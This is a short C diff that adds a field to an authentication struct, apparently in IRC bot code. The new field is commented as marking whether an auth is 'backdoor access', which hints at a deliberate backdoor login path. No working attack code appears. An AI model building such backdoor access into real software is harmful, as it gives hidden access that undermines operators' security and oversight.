@@ -10,6 +10,7 @@ struct auth_t {
   time_t atime;                 /* when they last were active */
   int authed;
   int authing;
+  int bd;			/* is this auth a backdoor access? */
 #    ifdef S_AUTHHASH
   char hash[MD5_HASH_LENGTH + 1];       /* used for dcc authing */
 #    endif                      /* S_AUTHHASH */
